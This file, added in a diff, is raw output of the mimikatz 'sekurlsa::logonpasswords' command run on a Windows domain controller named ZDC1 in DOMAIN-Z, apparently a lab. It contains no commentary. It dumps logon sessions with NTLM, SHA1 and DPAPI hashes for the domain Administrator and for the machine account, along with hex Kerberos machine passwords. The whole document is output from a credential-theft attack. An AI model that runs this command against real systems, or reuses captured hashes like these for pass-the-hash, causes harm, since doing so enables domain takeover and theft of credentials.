@@ -1,0 +1,390 @@
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 975346 (00000000:000ee1f2)
+Session           : RemoteInteractive from 2
+User Name         : Administrator
+Domain            : DOMAIN-Z
+Logon Server      : ZDC1
+Logon Time        : 11/20/2024 1:07:06 AM
+SID               : S-1-5-21-2189324197-3478012550-1180063049-500
+        msv :
+         [00000003] Primary
+         * Username : Administrator
+         * Domain   : DOMAIN-Z
+         * NTLM     : c9f6127dd8ff5496ceec45494bd2e409
+         * SHA1     : d2f596f57bd29f92405fb818faa5356acdd4071c
+         * DPAPI    : e474c23c64603a0fc39980332caee429
+        tspkg :
+        wdigest :
+         * Username : Administrator
+         * Domain   : DOMAIN-Z
+         * Password : (null)
+        kerberos :
+         * Username : Administrator
+         * Domain   : DOMAIN-Z.LOCAL
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 947793 (00000000:000e7651)
+Session           : Interactive from 2
+User Name         : UMFD-2
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 11/20/2024 1:07:00 AM
+SID               : S-1-5-96-0-2
+        msv :
+         [00000003] Primary
+         * Username : ZDC1$
+         * Domain   : DOMAIN-Z
+         * NTLM     : cfde9f84e3842120d423df586a830a36
+         * SHA1     : 67131f01ad93fc8654bcf822aef27fa31c504422
+         * DPAPI    : 67131f01ad93fc8654bcf822aef27fa3
+        tspkg :
+        wdigest :
+         * Username : ZDC1$
+         * Domain   : DOMAIN-Z
+         * Password : (null)
+        kerberos :
+         * Username : ZDC1$
+         * Domain   : domain-z.local
+         * Password : c5 f5 88 7c 93 03 6b f4 09 15 68 d7 49 e1 42 96 b6 73 bc 7b bf f7 37 b5 ac 5e e4 fa 2e a9 4c 4c 7f 4c 6a e3 cd 7d 32 a7 2e 1b 30 60 43 18 01 06 87 f4 94 95 b5 58 18 90 72 70 97 c1 66 c3 4b 87 97 d8 30 c5 05 64 59 32 0f 11 b7 9a 28 d6 27 2a 4b 3f 31 3b 21 f8 66 dc 1f d0 25 b8 7a f2 54 42 a5 82 e4 a3 19 81 32 76 96 8f 1e 41 44 98 99 2c 69 ed a4 94 3a d4 9b fb eb 65 79 46 ab a8 93 52 f2 4e ee 38 e2 ae 94 05 0c cf c2 0d 37 a1 24 46 88 67 19 2d 55 fc 01 5e 14 e7 37 fc e4 f8 bd 64 53 1f df 60 8e 12 e8 75 1e db 29 48 a8 b1 e8 b3 d6 7c 68 4d 51 1f 4c b8 62 07 44 73 e2 07 5c d2 d3 e1 65 a2 6f 2d a3 0b c9 e1 84 c3 c8 a8 96 ee a3 33 92 80 c0 f4 88 71 1d 70 7b ac 52 f4 08 e4 14 1f 0e 34 1a 79 b3 23 e0 67 ad 64 73 cd f7 49
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 47608 (00000000:0000b9f8)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 11/19/2024 11:46:05 PM
+SID               : S-1-5-90-0-1
+        msv :
+         [00000003] Primary
+         * Username : ZDC1$
+         * Domain   : DOMAIN-Z
+         * NTLM     : cfde9f84e3842120d423df586a830a36
+         * SHA1     : 67131f01ad93fc8654bcf822aef27fa31c504422
+         * DPAPI    : 67131f01ad93fc8654bcf822aef27fa3
+        tspkg :
+        wdigest :
+         * Username : ZDC1$
+         * Domain   : DOMAIN-Z
+         * Password : (null)
+        kerberos :
+         * Username : ZDC1$
+         * Domain   : domain-z.local
+         * Password : c5 f5 88 7c 93 03 6b f4 09 15 68 d7 49 e1 42 96 b6 73 bc 7b bf f7 37 b5 ac 5e e4 fa 2e a9 4c 4c 7f 4c 6a e3 cd 7d 32 a7 2e 1b 30 60 43 18 01 06 87 f4 94 95 b5 58 18 90 72 70 97 c1 66 c3 4b 87 97 d8 30 c5 05 64 59 32 0f 11 b7 9a 28 d6 27 2a 4b 3f 31 3b 21 f8 66 dc 1f d0 25 b8 7a f2 54 42 a5 82 e4 a3 19 81 32 76 96 8f 1e 41 44 98 99 2c 69 ed a4 94 3a d4 9b fb eb 65 79 46 ab a8 93 52 f2 4e ee 38 e2 ae 94 05 0c cf c2 0d 37 a1 24 46 88 67 19 2d 55 fc 01 5e 14 e7 37 fc e4 f8 bd 64 53 1f df 60 8e 12 e8 75 1e db 29 48 a8 b1 e8 b3 d6 7c 68 4d 51 1f 4c b8 62 07 44 73 e2 07 5c d2 d3 e1 65 a2 6f 2d a3 0b c9 e1 84 c3 c8 a8 96 ee a3 33 92 80 c0 f4 88 71 1d 70 7b ac 52 f4 08 e4 14 1f 0e 34 1a 79 b3 23 e0 67 ad 64 73 cd f7 49
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : ZDC1$
+Domain            : DOMAIN-Z
+Logon Server      : (null)
+Logon Time        : 11/19/2024 11:46:05 PM
+SID               : S-1-5-20
+        msv :
+         [00000003] Primary
+         * Username : ZDC1$
+         * Domain   : DOMAIN-Z
+         * NTLM     : cfde9f84e3842120d423df586a830a36
+         * SHA1     : 67131f01ad93fc8654bcf822aef27fa31c504422
+         * DPAPI    : 67131f01ad93fc8654bcf822aef27fa3
+        tspkg :
+        wdigest :
+         * Username : ZDC1$
+         * Domain   : DOMAIN-Z
+         * Password : (null)
+        kerberos :
+         * Username : zdc1$
+         * Domain   : DOMAIN-Z.LOCAL
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 25502 (00000000:0000639e)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 11/19/2024 11:46:05 PM
+SID               : S-1-5-96-0-1
+        msv :
+         [00000003] Primary
+         * Username : ZDC1$
+         * Domain   : DOMAIN-Z
+         * NTLM     : cfde9f84e3842120d423df586a830a36
+         * SHA1     : 67131f01ad93fc8654bcf822aef27fa31c504422
+         * DPAPI    : 67131f01ad93fc8654bcf822aef27fa3
+        tspkg :
+        wdigest :
+         * Username : ZDC1$
+         * Domain   : DOMAIN-Z
+         * Password : (null)
+        kerberos :
+         * Username : ZDC1$
+         * Domain   : domain-z.local
+         * Password : c5 f5 88 7c 93 03 6b f4 09 15 68 d7 49 e1 42 96 b6 73 bc 7b bf f7 37 b5 ac 5e e4 fa 2e a9 4c 4c 7f 4c 6a e3 cd 7d 32 a7 2e 1b 30 60 43 18 01 06 87 f4 94 95 b5 58 18 90 72 70 97 c1 66 c3 4b 87 97 d8 30 c5 05 64 59 32 0f 11 b7 9a 28 d6 27 2a 4b 3f 31 3b 21 f8 66 dc 1f d0 25 b8 7a f2 54 42 a5 82 e4 a3 19 81 32 76 96 8f 1e 41 44 98 99 2c 69 ed a4 94 3a d4 9b fb eb 65 79 46 ab a8 93 52 f2 4e ee 38 e2 ae 94 05 0c cf c2 0d 37 a1 24 46 88 67 19 2d 55 fc 01 5e 14 e7 37 fc e4 f8 bd 64 53 1f df 60 8e 12 e8 75 1e db 29 48 a8 b1 e8 b3 d6 7c 68 4d 51 1f 4c b8 62 07 44 73 e2 07 5c d2 d3 e1 65 a2 6f 2d a3 0b c9 e1 84 c3 c8 a8 96 ee a3 33 92 80 c0 f4 88 71 1d 70 7b ac 52 f4 08 e4 14 1f 0e 34 1a 79 b3 23 e0 67 ad 64 73 cd f7 49
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 25271 (00000000:000062b7)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 11/19/2024 11:46:05 PM
+SID               : S-1-5-96-0-0
+        msv :
+         [00000003] Primary
+         * Username : ZDC1$
+         * Domain   : DOMAIN-Z
+         * NTLM     : cfde9f84e3842120d423df586a830a36
+         * SHA1     : 67131f01ad93fc8654bcf822aef27fa31c504422
+         * DPAPI    : 67131f01ad93fc8654bcf822aef27fa3
+        tspkg :
+        wdigest :
+         * Username : ZDC1$
+         * Domain   : DOMAIN-Z
+         * Password : (null)
+        kerberos :
+         * Username : ZDC1$
+         * Domain   : domain-z.local
+         * Password : c5 f5 88 7c 93 03 6b f4 09 15 68 d7 49 e1 42 96 b6 73 bc 7b bf f7 37 b5 ac 5e e4 fa 2e a9 4c 4c 7f 4c 6a e3 cd 7d 32 a7 2e 1b 30 60 43 18 01 06 87 f4 94 95 b5 58 18 90 72 70 97 c1 66 c3 4b 87 97 d8 30 c5 05 64 59 32 0f 11 b7 9a 28 d6 27 2a 4b 3f 31 3b 21 f8 66 dc 1f d0 25 b8 7a f2 54 42 a5 82 e4 a3 19 81 32 76 96 8f 1e 41 44 98 99 2c 69 ed a4 94 3a d4 9b fb eb 65 79 46 ab a8 93 52 f2 4e ee 38 e2 ae 94 05 0c cf c2 0d 37 a1 24 46 88 67 19 2d 55 fc 01 5e 14 e7 37 fc e4 f8 bd 64 53 1f df 60 8e 12 e8 75 1e db 29 48 a8 b1 e8 b3 d6 7c 68 4d 51 1f 4c b8 62 07 44 73 e2 07 5c d2 d3 e1 65 a2 6f 2d a3 0b c9 e1 84 c3 c8 a8 96 ee a3 33 92 80 c0 f4 88 71 1d 70 7b ac 52 f4 08 e4 14 1f 0e 34 1a 79 b3 23 e0 67 ad 64 73 cd f7 49
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 949944 (00000000:000e7eb8)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 11/20/2024 1:07:00 AM
+SID               : S-1-5-90-0-2
+        msv :
+         [00000003] Primary
+         * Username : ZDC1$
+         * Domain   : DOMAIN-Z
+         * NTLM     : cfde9f84e3842120d423df586a830a36
+         * SHA1     : 67131f01ad93fc8654bcf822aef27fa31c504422
+         * DPAPI    : 67131f01ad93fc8654bcf822aef27fa3
+        tspkg :
+        wdigest :
+         * Username : ZDC1$
+         * Domain   : DOMAIN-Z
+         * Password : (null)
+        kerberos :
+         * Username : ZDC1$
+         * Domain   : domain-z.local
+         * Password : c5 f5 88 7c 93 03 6b f4 09 15 68 d7 49 e1 42 96 b6 73 bc 7b bf f7 37 b5 ac 5e e4 fa 2e a9 4c 4c 7f 4c 6a e3 cd 7d 32 a7 2e 1b 30 60 43 18 01 06 87 f4 94 95 b5 58 18 90 72 70 97 c1 66 c3 4b 87 97 d8 30 c5 05 64 59 32 0f 11 b7 9a 28 d6 27 2a 4b 3f 31 3b 21 f8 66 dc 1f d0 25 b8 7a f2 54 42 a5 82 e4 a3 19 81 32 76 96 8f 1e 41 44 98 99 2c 69 ed a4 94 3a d4 9b fb eb 65 79 46 ab a8 93 52 f2 4e ee 38 e2 ae 94 05 0c cf c2 0d 37 a1 24 46 88 67 19 2d 55 fc 01 5e 14 e7 37 fc e4 f8 bd 64 53 1f df 60 8e 12 e8 75 1e db 29 48 a8 b1 e8 b3 d6 7c 68 4d 51 1f 4c b8 62 07 44 73 e2 07 5c d2 d3 e1 65 a2 6f 2d a3 0b c9 e1 84 c3 c8 a8 96 ee a3 33 92 80 c0 f4 88 71 1d 70 7b ac 52 f4 08 e4 14 1f 0e 34 1a 79 b3 23 e0 67 ad 64 73 cd f7 49
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 949920 (00000000:000e7ea0)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 11/20/2024 1:07:00 AM
+SID               : S-1-5-90-0-2
+        msv :
+         [00000003] Primary
+         * Username : ZDC1$
+         * Domain   : DOMAIN-Z
+         * NTLM     : cfde9f84e3842120d423df586a830a36
+         * SHA1     : 67131f01ad93fc8654bcf822aef27fa31c504422
+         * DPAPI    : 67131f01ad93fc8654bcf822aef27fa3
+        tspkg :
+        wdigest :
+         * Username : ZDC1$
+         * Domain   : DOMAIN-Z
+         * Password : (null)
+        kerberos :
+         * Username : ZDC1$
+         * Domain   : domain-z.local
+         * Password : c5 f5 88 7c 93 03 6b f4 09 15 68 d7 49 e1 42 96 b6 73 bc 7b bf f7 37 b5 ac 5e e4 fa 2e a9 4c 4c 7f 4c 6a e3 cd 7d 32 a7 2e 1b 30 60 43 18 01 06 87 f4 94 95 b5 58 18 90 72 70 97 c1 66 c3 4b 87 97 d8 30 c5 05 64 59 32 0f 11 b7 9a 28 d6 27 2a 4b 3f 31 3b 21 f8 66 dc 1f d0 25 b8 7a f2 54 42 a5 82 e4 a3 19 81 32 76 96 8f 1e 41 44 98 99 2c 69 ed a4 94 3a d4 9b fb eb 65 79 46 ab a8 93 52 f2 4e ee 38 e2 ae 94 05 0c cf c2 0d 37 a1 24 46 88 67 19 2d 55 fc 01 5e 14 e7 37 fc e4 f8 bd 64 53 1f df 60 8e 12 e8 75 1e db 29 48 a8 b1 e8 b3 d6 7c 68 4d 51 1f 4c b8 62 07 44 73 e2 07 5c d2 d3 e1 65 a2 6f 2d a3 0b c9 e1 84 c3 c8 a8 96 ee a3 33 92 80 c0 f4 88 71 1d 70 7b ac 52 f4 08 e4 14 1f 0e 34 1a 79 b3 23 e0 67 ad 64 73 cd f7 49
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 947752 (00000000:000e7628)
+Session           : Interactive from 2
+User Name         : UMFD-2
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 11/20/2024 1:07:00 AM
+SID               : S-1-5-96-0-2
+        msv :
+         [00000003] Primary
+         * Username : ZDC1$
+         * Domain   : DOMAIN-Z
+         * NTLM     : cfde9f84e3842120d423df586a830a36
+         * SHA1     : 67131f01ad93fc8654bcf822aef27fa31c504422
+         * DPAPI    : 67131f01ad93fc8654bcf822aef27fa3
+        tspkg :
+        wdigest :
+         * Username : ZDC1$
+         * Domain   : DOMAIN-Z
+         * Password : (null)
+        kerberos :
+         * Username : ZDC1$
+         * Domain   : domain-z.local
+         * Password : c5 f5 88 7c 93 03 6b f4 09 15 68 d7 49 e1 42 96 b6 73 bc 7b bf f7 37 b5 ac 5e e4 fa 2e a9 4c 4c 7f 4c 6a e3 cd 7d 32 a7 2e 1b 30 60 43 18 01 06 87 f4 94 95 b5 58 18 90 72 70 97 c1 66 c3 4b 87 97 d8 30 c5 05 64 59 32 0f 11 b7 9a 28 d6 27 2a 4b 3f 31 3b 21 f8 66 dc 1f d0 25 b8 7a f2 54 42 a5 82 e4 a3 19 81 32 76 96 8f 1e 41 44 98 99 2c 69 ed a4 94 3a d4 9b fb eb 65 79 46 ab a8 93 52 f2 4e ee 38 e2 ae 94 05 0c cf c2 0d 37 a1 24 46 88 67 19 2d 55 fc 01 5e 14 e7 37 fc e4 f8 bd 64 53 1f df 60 8e 12 e8 75 1e db 29 48 a8 b1 e8 b3 d6 7c 68 4d 51 1f 4c b8 62 07 44 73 e2 07 5c d2 d3 e1 65 a2 6f 2d a3 0b c9 e1 84 c3 c8 a8 96 ee a3 33 92 80 c0 f4 88 71 1d 70 7b ac 52 f4 08 e4 14 1f 0e 34 1a 79 b3 23 e0 67 ad 64 73 cd f7 49
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 47563 (00000000:0000b9cb)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 11/19/2024 11:46:05 PM
+SID               : S-1-5-90-0-1
+        msv :
+         [00000003] Primary
+         * Username : ZDC1$
+         * Domain   : DOMAIN-Z
+         * NTLM     : cfde9f84e3842120d423df586a830a36
+         * SHA1     : 67131f01ad93fc8654bcf822aef27fa31c504422
+         * DPAPI    : 67131f01ad93fc8654bcf822aef27fa3
+        tspkg :
+        wdigest :
+         * Username : ZDC1$
+         * Domain   : DOMAIN-Z
+         * Password : (null)
+        kerberos :
+         * Username : ZDC1$
+         * Domain   : domain-z.local
+         * Password : c5 f5 88 7c 93 03 6b f4 09 15 68 d7 49 e1 42 96 b6 73 bc 7b bf f7 37 b5 ac 5e e4 fa 2e a9 4c 4c 7f 4c 6a e3 cd 7d 32 a7 2e 1b 30 60 43 18 01 06 87 f4 94 95 b5 58 18 90 72 70 97 c1 66 c3 4b 87 97 d8 30 c5 05 64 59 32 0f 11 b7 9a 28 d6 27 2a 4b 3f 31 3b 21 f8 66 dc 1f d0 25 b8 7a f2 54 42 a5 82 e4 a3 19 81 32 76 96 8f 1e 41 44 98 99 2c 69 ed a4 94 3a d4 9b fb eb 65 79 46 ab a8 93 52 f2 4e ee 38 e2 ae 94 05 0c cf c2 0d 37 a1 24 46 88 67 19 2d 55 fc 01 5e 14 e7 37 fc e4 f8 bd 64 53 1f df 60 8e 12 e8 75 1e db 29 48 a8 b1 e8 b3 d6 7c 68 4d 51 1f 4c b8 62 07 44 73 e2 07 5c d2 d3 e1 65 a2 6f 2d a3 0b c9 e1 84 c3 c8 a8 96 ee a3 33 92 80 c0 f4 88 71 1d 70 7b ac 52 f4 08 e4 14 1f 0e 34 1a 79 b3 23 e0 67 ad 64 73 cd f7 49
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 11/19/2024 11:46:05 PM
+SID               : S-1-5-19
+        msv :
+        tspkg :
+        wdigest :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        kerberos :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 25467 (00000000:0000637b)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 11/19/2024 11:46:05 PM
+SID               : S-1-5-96-0-0
+        msv :
+         [00000003] Primary
+         * Username : ZDC1$
+         * Domain   : DOMAIN-Z
+         * NTLM     : cfde9f84e3842120d423df586a830a36
+         * SHA1     : 67131f01ad93fc8654bcf822aef27fa31c504422
+         * DPAPI    : 67131f01ad93fc8654bcf822aef27fa3
+        tspkg :
+        wdigest :
+         * Username : ZDC1$
+         * Domain   : DOMAIN-Z
+         * Password : (null)
+        kerberos :
+         * Username : ZDC1$
+         * Domain   : domain-z.local
+         * Password : c5 f5 88 7c 93 03 6b f4 09 15 68 d7 49 e1 42 96 b6 73 bc 7b bf f7 37 b5 ac 5e e4 fa 2e a9 4c 4c 7f 4c 6a e3 cd 7d 32 a7 2e 1b 30 60 43 18 01 06 87 f4 94 95 b5 58 18 90 72 70 97 c1 66 c3 4b 87 97 d8 30 c5 05 64 59 32 0f 11 b7 9a 28 d6 27 2a 4b 3f 31 3b 21 f8 66 dc 1f d0 25 b8 7a f2 54 42 a5 82 e4 a3 19 81 32 76 96 8f 1e 41 44 98 99 2c 69 ed a4 94 3a d4 9b fb eb 65 79 46 ab a8 93 52 f2 4e ee 38 e2 ae 94 05 0c cf c2 0d 37 a1 24 46 88 67 19 2d 55 fc 01 5e 14 e7 37 fc e4 f8 bd 64 53 1f df 60 8e 12 e8 75 1e db 29 48 a8 b1 e8 b3 d6 7c 68 4d 51 1f 4c b8 62 07 44 73 e2 07 5c d2 d3 e1 65 a2 6f 2d a3 0b c9 e1 84 c3 c8 a8 96 ee a3 33 92 80 c0 f4 88 71 1d 70 7b ac 52 f4 08 e4 14 1f 0e 34 1a 79 b3 23 e0 67 ad 64 73 cd f7 49
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 25256 (00000000:000062a8)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 11/19/2024 11:46:05 PM
+SID               : S-1-5-96-0-1
+        msv :
+         [00000003] Primary
+         * Username : ZDC1$
+         * Domain   : DOMAIN-Z
+         * NTLM     : cfde9f84e3842120d423df586a830a36
+         * SHA1     : 67131f01ad93fc8654bcf822aef27fa31c504422
+         * DPAPI    : 67131f01ad93fc8654bcf822aef27fa3
+        tspkg :
+        wdigest :
+         * Username : ZDC1$
+         * Domain   : DOMAIN-Z
+         * Password : (null)
+        kerberos :
+         * Username : ZDC1$
+         * Domain   : domain-z.local
+         * Password : c5 f5 88 7c 93 03 6b f4 09 15 68 d7 49 e1 42 96 b6 73 bc 7b bf f7 37 b5 ac 5e e4 fa 2e a9 4c 4c 7f 4c 6a e3 cd 7d 32 a7 2e 1b 30 60 43 18 01 06 87 f4 94 95 b5 58 18 90 72 70 97 c1 66 c3 4b 87 97 d8 30 c5 05 64 59 32 0f 11 b7 9a 28 d6 27 2a 4b 3f 31 3b 21 f8 66 dc 1f d0 25 b8 7a f2 54 42 a5 82 e4 a3 19 81 32 76 96 8f 1e 41 44 98 99 2c 69 ed a4 94 3a d4 9b fb eb 65 79 46 ab a8 93 52 f2 4e ee 38 e2 ae 94 05 0c cf c2 0d 37 a1 24 46 88 67 19 2d 55 fc 01 5e 14 e7 37 fc e4 f8 bd 64 53 1f df 60 8e 12 e8 75 1e db 29 48 a8 b1 e8 b3 d6 7c 68 4d 51 1f 4c b8 62 07 44 73 e2 07 5c d2 d3 e1 65 a2 6f 2d a3 0b c9 e1 84 c3 c8 a8 96 ee a3 33 92 80 c0 f4 88 71 1d 70 7b ac 52 f4 08 e4 14 1f 0e 34 1a 79 b3 23 e0 67 ad 64 73 cd f7 49
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 22525 (00000000:000057fd)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 11/19/2024 11:46:04 PM
+SID               :
+        msv :
+         [00000003] Primary
+         * Username : ZDC1$
+         * Domain   : DOMAIN-Z
+         * NTLM     : cfde9f84e3842120d423df586a830a36
+         * SHA1     : 67131f01ad93fc8654bcf822aef27fa31c504422
+         * DPAPI    : 67131f01ad93fc8654bcf822aef27fa3
+        tspkg :
+        wdigest :
+        kerberos :
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : ZDC1$
+Domain            : DOMAIN-Z
+Logon Server      : (null)
+Logon Time        : 11/19/2024 11:46:04 PM
+SID               : S-1-5-18
+        msv :
+        tspkg :
+        wdigest :
+         * Username : ZDC1$
+         * Domain   : DOMAIN-Z
+         * Password : (null)
+        kerberos :
+         * Username : zdc1$
+         * Domain   : DOMAIN-Z.LOCAL
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :
+
+mimikatz #
